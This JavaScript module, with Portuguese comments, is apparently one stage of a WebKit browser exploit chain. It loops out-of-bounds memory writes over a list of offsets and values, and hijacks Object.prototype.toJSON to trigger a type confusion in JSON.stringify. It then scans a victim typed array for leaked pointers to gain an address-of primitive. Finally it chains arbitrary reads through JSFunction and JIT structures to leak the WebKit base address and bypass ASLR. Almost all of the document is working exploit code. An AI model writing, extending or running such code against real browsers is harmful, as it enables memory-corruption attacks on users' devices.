// js/script3/testArrayBufferVictimCrash.mjs (R43L - Testes Massivos Finais para Addrof - CORREÇÃO ERRO)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_MassiveFinalAddrof_Fix"; // Novo nome

const VICTIM_TA_DEFAULT_SIZE_ELEMENTS = 16;
const OOB_OFFSETS_TO_TEST_FINAL = [0x6C, 0x70, 0x74, 0x78, 0x7C, 0x80, 0x84, 0x88, 0x8C, 0x90];
const OOB_VALUES_TO_TEST_FINAL = [
    0xABABABAB, 0xCDCDCDCD, 0xFFFFFFFF, 0x00000000, 0x41414141,
    (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID || 0xDEF00002),
];

const FILL_PATTERN_VICTIM_TA_FINAL = 0xBADF00D5;
const PROBE_CALL_LIMIT_V82 = 10;

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let global_target_function_for_webkit_leak;
let leaked_m2_or_target_addr = null; // Endereço obtido na iteração atual

// Flags globais de sucesso para parar cedo
let global_addrof_obtained_overall_flag = false;
let global_webkit_leak_obtained_overall_flag = false;


function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */
    if (!isAdvancedInt64Object(ptr)) { logS3(`[isValidPointer-${context}] Input não é AdvInt64: ${String(ptr)}`, "debug_detail"); return false; }
    const high = ptr.high(); const low = ptr.low();
    if (high === 0 && low === 0) { logS3(`[isValidPointer-${context}] NULO: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0x7FF80000 && low === 0x0) { logS3(`[isValidPointer-${context}] NaN Específico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) { logS3(`[isValidPointer-${context}] NaN Genérico: ${ptr.toString(true)}`, "debug_detail"); return false; }
    if (high === 0 && low < 0x10000) { logS3(`[isValidPointer-${context}] Ponteiro Baixo: ${ptr.toString(true)}`, "debug_detail"); return false; }
    return true;
}
function safeToHex(value, length = 8) { /* ... (sem alteração) ... */
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    try { return toHex(value); } catch (e) { return String(value); }
}
function logTypedArrayShort(ta, name = "TypedArray", max = 8) { /* ... (sem alteração) ... */
    if (!ta || typeof ta.slice !== 'function') { return "N/A"; }
    const content = Array.from(ta.slice(0, Math.min(ta.length, max))).map(v => safeToHex(v));
    return `${name}[${content.join(", ")}${ta.length > max ? "..." : ""}] (len:${ta.length}, byteLen:${ta.byteLength})`;
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Testes Massivos Finais Addrof (Fix) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init MassiveFinalFix...`;

    global_target_function_for_webkit_leak = function someUniqueLeakFunctionR43L_MassiveFinalFix() { return `target_R43L_MassiveFinalFix_${Date.now()}`; };
    
    let final_probe_call_count_for_report = 0;

    logS3(`--- Fase 0 (MassiveFinalFix): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) { /* ... (retorno de erro) ... */
        return { errorOccurred: "OOB Sanity Check Failed", tc_probe_details: null, 
                 addrof_result: { success: false, msg: "Addrof (MassiveFinalFix): Not run." },
                 webkit_leak_result: { success: false, msg: "WebKit Leak (MassiveFinalFix): Not run." },
                 iteration_results_summary: [], total_probe_calls_last_iter: 0, 
                 oob_params_of_best_result: null, heisenbug_on_M2_in_best_result: false, 
                 best_victim_analysis: null }; 
    }

    let iteration_results_summary = [];
    let best_result_overall = {
        errorOccurred: null, tc_probe_details: null, stringifyResultSonda: null,
        addrof_result: { success: false, msg: "Addrof (MassiveFinalFix): Não obtido.", leaked_object_addr: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (MassiveFinalFix): Não obtido.", webkit_base_candidate: null },
        oob_params_of_best_result: null,
        heisenbug_on_M2_confirmed_by_tc_probe: false, // Reflete o melhor resultado
        best_victim_analysis: null
    };
    
    global_addrof_obtained_overall_flag = false; // Resetar flags globais
    global_webkit_leak_obtained_overall_flag = false;

    for (const current_oob_offset of OOB_OFFSETS_TO_TEST_FINAL) {
        if (global_addrof_obtained_overall_flag && global_webkit_leak_obtained_overall_flag) break; 

        for (const current_oob_value of OOB_VALUES_TO_TEST_FINAL) {
            if (global_addrof_obtained_overall_flag && global_webkit_leak_obtained_overall_flag) break;
            if (current_oob_value === null || current_oob_value === undefined) continue;

            leaked_m2_or_target_addr = null; 
            // CORRIGIDO: Declarar flags de sucesso da iteração aqui, no escopo correto
            let found_addrof_primitive_this_iter = false;
            let found_arb_rw_via_victim_ta_this_iter = false;


            const current_oob_hex_val = safeToHex(current_oob_value);
            const current_offset_hex = safeToHex(current_oob_offset);
            const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${current_offset_hex}_Val${current_oob_hex_val}`;

            logS3(`\n===== ITERATION MassiveFinalFix: Offset OOB: ${current_offset_hex}, Valor OOB: ${current_oob_hex_val} =====`, "subtest", FNAME_CURRENT_ITERATION);
            // ... (document.title)

            let victim_ta_for_json_trigger = null; 
            let iter_victim_analysis = { /* ... */ 
                offset_tested: current_offset_hex, value_written: current_oob_hex_val,
                notes: "", found_pointers_in_victim_ta: [],
                addrof_achieved_via_victim_corruption: false
            };

            let probe_call_count_iter = 0;
            let m1_ref = null; let m2_ref = null;
            let tc_detected_this_iter = false;
            let tc_details_this_iter = null;

            function massive_final_fix_probe_toJSON() {
                probe_call_count_iter++; const call_num = probe_call_count_iter;
                const ctts = Object.prototype.toString.call(this);
                const is_m2c = (this === m2_ref && m2_ref !== null);

                try {
                    if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                    if (call_num === 1 && this === victim_ta_for_json_trigger) {
                        m2_ref = { id: "M2_MassiveFinalFix", target_function_prop: global_target_function_for_webkit_leak };
                        m1_ref = { id: "M1_MassiveFinalFix", m2: m2_ref };
                        logS3(`[PROBE_MassiveFinalFix] Call #${call_num}: 'this' é victim_ta_for_json_trigger. M1/M2 criados.`, "debug_detail");
                        
                        logS3(`   [PROBE_MassiveFinalFix] Analisando victim_ta_for_json_trigger DENTRO da 1a chamada da sonda:`, "info_emphasis");
                        for (let i = 0; i < victim_ta_for_json_trigger.length - 1; i += 2) {
                            const low = victim_ta_for_json_trigger[i];
                            const high = victim_ta_for_json_trigger[i+1];
                            if (low !== FILL_PATTERN_VICTIM_TA_FINAL || high !== FILL_PATTERN_VICTIM_TA_FINAL) {
                                let potential_ptr = new AdvancedInt64(low, high);
                                logS3(`     victim_ta[${i}/${i+1}]: L=0x${low.toString(16)}, H=0x${high.toString(16)} -> ${potential_ptr.toString(true)}`, "leak");
                                if (isValidPointer(potential_ptr, "_victimCorruptionCheckFix")) {
                                    logS3(`       !!! PONTEIRO VÁLIDO ENCONTRADO em victim_ta[${i}/${i+1}]: ${potential_ptr.toString(true)} !!!`, "success_major");
                                    iter_victim_analysis.found_pointers_in_victim_ta.push({index: i, low: low, high: high, addr_str: potential_ptr.toString(true)});
                                    if (!leaked_m2_or_target_addr) { // Pegar o primeiro encontrado
                                        leaked_m2_or_target_addr = potential_ptr;
                                        iter_victim_analysis.addrof_achieved_via_victim_corruption = true;
                                        found_addrof_primitive_this_iter = true; // Sinalizar sucesso nesta iteração
                                        // Não definir global_addrof_obtained_overall_flag aqui ainda, apenas no final da iteração
                                        iter_victim_analysis.notes += `Addrof putativo via victim_ta[${i}]: ${potential_ptr.toString(true)}. `;
                                    }
                                }
                            }
                        }
                        if (!iter_victim_analysis.addrof_achieved_via_victim_corruption) {
                            logS3(`   [PROBE_MassiveFinalFix] Nenhum ponteiro válido óbvio encontrado em victim_ta.`, "info");
                        }
                        return m1_ref;
                    } else if (is_m2c) {
                        if (!tc_detected_this_iter) {
                            tc_detected_this_iter = true;
                            tc_details_this_iter = { call_number_tc_detected: call_num, probe_variant: "MassiveFinalFixProbe", this_is_M2: true, this_type_actual: ctts, notes: "TC Confirmada."};
                            logS3(`[PROBE_MassiveFinalFix] Call #${call_num} (M2C): FIRST TC. 'this' é M2 (id: ${this.id}).`, "vuln");
                        }
                        return this;
                    }
                } catch (e_pm) { /* ... */ }
                return { gen_m: call_num, type: ctts };
            }

            let iter_primary_error = null;
            let iter_stringify_output_raw = null;
            try {
                victim_ta_for_json_trigger = new Uint32Array(VICTIM_TA_DEFAULT_SIZE_ELEMENTS);
                victim_ta_for_json_trigger.fill(FILL_PATTERN_VICTIM_TA_FINAL);
                logS3(`   Victim Uint32Array (victim_ta_for_json_trigger) criado e preenchido.`, 'info');

                await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetup` });
                oob_write_absolute(current_oob_offset, current_oob_value, 4);
                logS3(`   OOB Write: ${current_oob_hex_val} @ ${current_offset_hex}`, 'info');
                await PAUSE_S3(150);

                const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
                try {
                    Object.defineProperty(Object.prototype, ppKey, { value: massive_final_fix_probe_toJSON, writable: true, configurable: true, enumerable: false });
                    polluted = true;
                    iter_stringify_output_raw = JSON.stringify(victim_ta_for_json_trigger);
                    logS3(`   JSON.stringify output: ${iter_stringify_output_raw ? iter_stringify_output_raw.substring(0,100) : "null" }...`, "debug_detail");
                    if (tc_detected_this_iter) logS3(`  TC Probe (MassiveFinalFix): TC CONFIRMADA.`, "vuln");
                    else logS3(`  TC Probe (MassiveFinalFix): TC NÃO Confirmada.`, "warn");
                } catch (e_str) { iter_primary_error = e_str; logS3(`  JSON.stringify EXCEPTION: ${e_str.message}`, "error"); }
                finally { if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; } }

                // Atualizar flag global de addrof se encontrado nesta iteração
                if (found_addrof_primitive_this_iter) {
                    global_addrof_obtained_overall_flag = true;
                }

                // Se addrof foi obtido NESTA iteração, tentar WebKitLeak
                if (found_addrof_primitive_this_iter && leaked_m2_or_target_addr) {
                    logS3(`  ADDROF OBTIDO NESTA ITERAÇÃO (${leaked_m2_or_target_addr.toString(true)})! Tentando WebKitLeak...`, "success_major");
                    let addr_for_wk_leak = null;
                    // Para vazar a base do WebKit, precisamos do endereço de uma *função*.
                    // O leaked_m2_or_target_addr pode ser de M2 ou da função em M2.target_function_prop.
                    // Se for de M2, precisamos ler o ponteiro da propriedade.
                    // Por simplicidade, vamos tentar usar target_function_for_webkit_leak diretamente se
                    // o addrof for do próprio m2_ref (e m2_ref tem target_function_prop).
                    // Este é o ponto onde precisamos saber o que leaked_m2_or_target_addr realmente é.
                    // Se assumirmos que é o endereço de `global_target_function_for_webkit_leak` (se o spray funcionasse assim)
                    // ou se pudéssemos confirmar que é `m2_ref` e ler `m2_ref.target_function_prop`.

                    // Cenário 1: leaked_m2_or_target_addr é o endereço de uma função.
                    // Cenário 2: leaked_m2_or_target_addr é o endereço de m2_ref.
                    // Precisamos de mais inteligência aqui para saber qual é.
                    // Se o ponteiro vazado for o de m2_ref, precisamos ler o ponteiro para target_function_prop dentro dele.
                    // Por exemplo, se target_function_prop for a primeira propriedade após o header do JSObject.
                    // const OFFSET_OF_FIRST_PROPERTY_SLOT = JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET; // Ou similar, depende do tipo de M2
                    // addr_for_wk_leak = await arb_read(leaked_m2_or_target_addr.add(OFFSET_OF_FIRST_PROPERTY_SLOT), 8);
                    // E se M2 não tiver butterfly inline (propriedades out-of-line)?
                    // Para este teste, vamos ser otimistas e assumir que se temos um addrof, é da *função alvo*.
                    // Em um exploit real, precisaríamos de uma forma de distinguir.
                    // Ou, se o addrof for de M2, e M2 tiver target_function_for_webkit_leak como prop,
                    // o WebKitLeak tentaria com o endereço de M2, o que falharia nos offsets de JSFunction.
                    // Vamos tentar com global_target_function_for_webkit_leak se o addrof for de M2,
                    // assumindo que o addrof de M2 nos permite então achar a função alvo com arb_read.
                    // ESTA PARTE É COMPLEXA E ESPECULATIVA SEM SABER O QUE `leaked_m2_or_target_addr` REALMENTE É.

                    // Simplificação: Se addrof funcionou, vamos *assumir* que leaked_m2_or_target_addr
                    // é o endereço da *função alvo* que colocamos em m2_ref.target_function_prop.
                    // Isso só seria verdade se a corrupção do victim_ta vazasse diretamente esse ponteiro.
                    addr_for_wk_leak = leaked_m2_or_target_addr; // Tentativa direta

                    if (addr_for_wk_leak && isValidPointer(addr_for_wk_leak, "_preWkLeakFix")) {
                        try {
                            const ptr_exe = await arb_read(addr_for_wk_leak.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
                            if (isValidPointer(ptr_exe, "_wkLeakExeFix")) {
                                const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
                                if (isValidPointer(ptr_jitvm, "_wkLeakJitVmFix")) {
                                    const base_candidate = ptr_jitvm.and(new AdvancedInt64(0x0, ~0xFFF));
                                    logS3(`  !!! POTENCIAL WEBKIT BASE: ${base_candidate.toString(true)} !!!`, "success_major");
                                    // Atualizar o resultado da iteração E o resultado global
                                    iter_victim_analysis.webkit_leak_success = true; // Marcar sucesso do WebKitLeak nesta iteração
                                    best_result_overall.webkit_leak_result = { success: true, msg: `WebKitLeak OK: ${base_candidate.toString(true)}`, webkit_base_candidate: base_candidate.toString(true) };
                                    global_webkit_leak_obtained_overall_flag = true;
                                } else { throw new Error("Ponteiro JIT/VM inválido."); }
                            } else { throw new Error("Ponteiro Executable inválido."); }
                        } catch(e_wk_leak) {
                            logS3(`  Erro no WebKitLeak: ${e_wk_leak.message}`, "error");
                            if(best_result_overall.webkit_leak_result.success === false) { // Só sobrescrever se não houver sucesso anterior
                                best_result_overall.webkit_leak_result = { success: false, msg: `WebKitLeak falhou: ${e_wk_leak.message}` };
                            }
                        }
                    } else {
                         logS3("  Endereço para WebKitLeak não é válido (leaked_m2_or_target_addr pode não ser de uma função).", "warn");
                    }
                }

            } catch (e_outer_iter) { iter_primary_error = e_outer_iter; }
            finally { await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClear` }); }

            final_probe_call_count_for_report = probe_call_count_iter;
            let current_iter_summary = {
                oob_offset: current_offset_hex, oob_value: current_oob_hex_val,
                raw_oob_offset: current_oob_offset, raw_oob_value: current_oob_value,
                error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
                tc_probe_details: tc_details_this_iter,
                victim_ta_analysis: iter_victim_analysis, // Renomeado de corruption_analysis
                addrof_success_this_iter: found_addrof_primitive_this_iter,
                webkit_leak_success_this_iter: iter_victim_analysis.webkit_leak_success || false, // Sucesso do WKLeak nesta iteração
                heisenbug_on_M2_confirmed_by_tc_probe: tc_detected_this_iter
            };
            iteration_results_summary.push(current_iter_summary);

            // Lógica para atualizar best_result_overall
            if (current_iter_summary.error === null) {
                let current_is_better = false;
                // Prioridade: WebKitLeak > Addrof > TC
                if (current_iter_summary.webkit_leak_success_this_iter && !best_result_overall.webkit_leak_result.success) current_is_better = true;
                else if (current_iter_summary.webkit_leak_success_this_iter === best_result_overall.webkit_leak_result.success) {
                    if (current_iter_summary.addrof_success_this_iter && !best_result_overall.addrof_result.success) current_is_better = true;
                    else if (current_iter_summary.addrof_success_this_iter === best_result_overall.addrof_result.success) {
                        // Se addrof já é igual, verificar se TC é melhor (só se os anteriores não melhoraram)
                        if (!current_iter_summary.addrof_success_this_iter && current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe && !best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe) current_is_better = true;
                    }
                }
                 if (best_result_overall.oob_params_of_best_result === null && !current_iter_summary.error) current_is_better = true; // Primeiro resultado sem erro

                if (current_is_better) {
                    best_result_overall.errorOccurred = null;
                    best_result_overall.tc_probe_details = current_iter_summary.tc_probe_details;
                    best_result_overall.addrof_result.success = current_iter_summary.addrof_success_this_iter;
                    if(current_iter_summary.addrof_success_this_iter && leaked_m2_or_target_addr) {
                        best_result_overall.addrof_result.leaked_object_addr = leaked_m2_or_target_addr.toString(true);
                        best_result_overall.addrof_result.msg = `Addrof obtido: ${leaked_m2_or_target_addr.toString(true)}`;
                    } else if (!current_iter_summary.addrof_success_this_iter && best_result_overall.addrof_result.success === false) { // Só resetar msg se não houver sucesso ainda
                        best_result_overall.addrof_result.msg = "Addrof (MassiveFinalFix): Não obtido no melhor resultado.";
                        best_result_overall.addrof_result.leaked_object_addr = null;
                    }
                    // WebKit leak result é atualizado se esta iteração for melhor e tiver WebKitLeak
                    if (current_iter_summary.webkit_leak_success_this_iter) {
                        // Já deve estar em best_result_overall.webkit_leak_result se foi o motivo de ser melhor
                    } else if (!best_result_overall.webkit_leak_result.success) { // Se o melhor anterior não tinha wk leak
                         best_result_overall.webkit_leak_result = { success: false, msg: "WebKit Leak (MassiveFinalFix): Não obtido no melhor resultado.", webkit_base_candidate: null };
                    }

                    best_result_overall.oob_params_of_best_result = { offset: current_offset_hex, value: current_oob_hex_val, raw_offset: current_oob_offset, raw_value: current_oob_value };
                    best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe = current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe;
                    best_result_overall.best_victim_analysis = current_iter_summary.victim_ta_analysis;
                    logS3(`*** NOVO MELHOR RESULTADO: Off ${current_offset_hex} Val ${current_oob_hex_val} (Addrof:${current_iter_summary.addrof_success_this_iter}, TC:${current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe}, WKLeak:${current_iter_summary.webkit_leak_success_this_iter}) ***`, "success_major");
                }
            }
            document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val} TC:${tc_detected_this_iter} Addr:${found_addrof_primitive_this_iter}`;
            await PAUSE_S3(50);
        }
        if (global_addrof_obtained_overall_flag && global_webkit_leak_obtained_overall_flag) break;
        await PAUSE_S3(100);
    }

    best_result_overall.total_probe_calls_last_iter = final_probe_call_count_for_report;
    best_result_overall.iteration_results_summary = iteration_results_summary;
    best_result_overall.oob_value_of_best_result = best_result_overall.oob_params_of_best_result ? `${best_result_overall.oob_params_of_best_result.offset}_${best_result_overall.oob_params_of_best_result.value}` : "N/A";

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final best_result_overall (Massive Test Final Fix): ${JSON.stringify(best_result_overall, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    let final_title = `${FNAME_CURRENT_TEST_BASE} Final: `;
    if(best_result_overall.webkit_leak_result.success) final_title += "WEBKITLEAK_OK! ";
    else if(best_result_overall.addrof_result.success) final_title += "ADDROF_OK! ";
    else if(best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe) final_title += "TC_OK ";
    if(final_title === `${FNAME_CURRENT_TEST_BASE} Final: `) final_title += "NoMajorSuccess";
    document.title = final_title.trim();

    return best_result_overall;
}
